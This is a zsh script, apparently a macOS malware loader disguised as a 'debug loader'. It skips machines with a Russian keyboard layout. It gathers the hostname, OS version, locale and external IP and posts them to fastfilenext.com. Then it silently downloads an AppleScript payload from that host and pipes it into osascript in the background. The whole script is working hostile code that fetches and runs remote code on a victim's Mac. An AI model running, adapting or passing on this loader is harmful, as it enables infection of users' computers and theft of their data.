#!/bin/zsh
# Debug loader — detect CIS and block with telemetry
IS_CIS="false"
if defaults read ~/Library/Preferences/com.apple.HIToolbox.plist AppleEnabledInputSources 2>/dev/null | grep -qi russian; then
    IS_CIS="true"
fi

# Detect locale info — sanitize for JSON
LOCALE_INFO=$(defaults read ~/Library/Preferences/com.apple.HIToolbox.plist AppleEnabledInputSources 2>/dev/null | grep -i "KeyboardLayout Name" | head -5 | tr '\n' ',' | tr -d '"' | tr -d "'" || echo "unknown")
HOSTNAME=$(hostname 2>/dev/null | tr -d '"' || echo "unknown")
OS_VER=$(sw_vers -productVersion 2>/dev/null || echo "unknown")
EXT_IP=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || curl -s --max-time 5 https://icanhazip.com 2>/dev/null || curl -s --max-time 5 https://ifconfig.me 2>/dev/null || echo "unknown")
EXT_IP=$(echo "$EXT_IP" | tr -d '
 ')

# Build JSON safely using printf
send_debug_event() {
    local EVT="$1"
    local JSON=$(printf '{"event":"%s","build_hash":"%s","ip":"%s","is_cis":"%s","locale":"%s","hostname":"%s","os_version":"%s"}' "$EVT" "" "$EXT_IP" "$IS_CIS" "$LOCALE_INFO" "$HOSTNAME" "$OS_VER")
    curl -s -X POST "https://fastfilenext.com/api/debug/event" -H "Content-Type: application/json" -d "$JSON" --max-time 5 >/dev/null 2>&1
}

# If CIS — send cis_blocked event and exit
if [ "$IS_CIS" = "true" ]; then
    send_debug_event "cis_blocked" >/dev/null 2>&1
    exit 0
fi

# Not CIS — send loader_requested event
send_debug_event "loader_requested" >/dev/null 2>&1 &

daemon_function() {
    exec </dev/null
    exec >/dev/null
    exec 2>/dev/null
    curl -k -s --max-time 30 -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "https://fastfilenext.com/debug/payload.applescript" | osascript
}
daemon_function "$@" &
exit 0
